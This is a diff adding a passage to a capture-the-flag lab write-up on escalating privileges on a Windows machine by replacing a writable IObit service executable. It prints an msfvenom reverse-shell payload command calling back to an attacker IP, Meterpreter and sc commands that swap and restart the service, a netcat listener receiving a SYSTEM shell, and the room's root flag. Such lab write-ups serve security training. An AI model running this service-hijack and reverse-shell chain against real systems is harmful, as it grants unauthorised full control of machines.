@@ -147,3 +147,120 @@ You can download the script here. Now you can use the upload command in Metasplo
 
 To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:
 
+![[Pasted image 20220817024815.png]]
+
+![[Pasted image 20220817024846.png]]
+
+Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
+
+- AdvancedSystemCareService9
+
+
+The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
+
+Use msfvenom to generate a reverse shell as an Windows executable.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.2.77.171 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
+
+Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
+
+
+
+```
+meterpreter > upload ASCService.exe
+[*] uploading  : /home/kali/ASCService.exe -> ASCService.exe
+[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/kali/ASCService.exe -> ASCService.exe
+[*] uploaded   : /home/kali/ASCService.exe -> ASCService.exe
+meterpreter > load powershell_shell
+Loading extension powershell_shell...
+[-] Failed to load extension: No module of the name powershell_shell found
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+
+
+PS > Set-Location "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+PS > Copy-Item ASCService.exe -Destination "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" -Force
+PS > Set-Location "C:\Program Files (x86)\IObit\Advanced SystemCare"
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>Stop-Service AdvancedSystemCareService9
+Stop-Service AdvancedSystemCareService9
+'Stop-Service' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
+sc start AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2876
+        FLAGS              : 
+
+C:\Program Files (x86)\IObit\Advanced SystemCare>
+
+```
+
+On Kali box:
+
+```
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 6666        
+listening on [any] 6666 ...
+connect to [10.2.77.171] from (UNKNOWN) [10.10.181.115] 49228
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+```
+
+
+What is the root flag?
+- 9af5f314f57607c00fd09803a587db80
+
+to get to root:
+
+```
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/12/2020  12:05 PM    <DIR>          .
+10/12/2020  12:05 PM    <DIR>          ..
+10/12/2020  12:05 PM             1,528 activation.ps1
+09/27/2019  05:41 AM                32 root.txt
+               2 File(s)          1,560 bytes
+               2 Dir(s)  44,156,686,336 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+9af5f314f57607c00fd09803a587db80
+C:\Users\Administrator\Desktop>
+
+```
+
+END
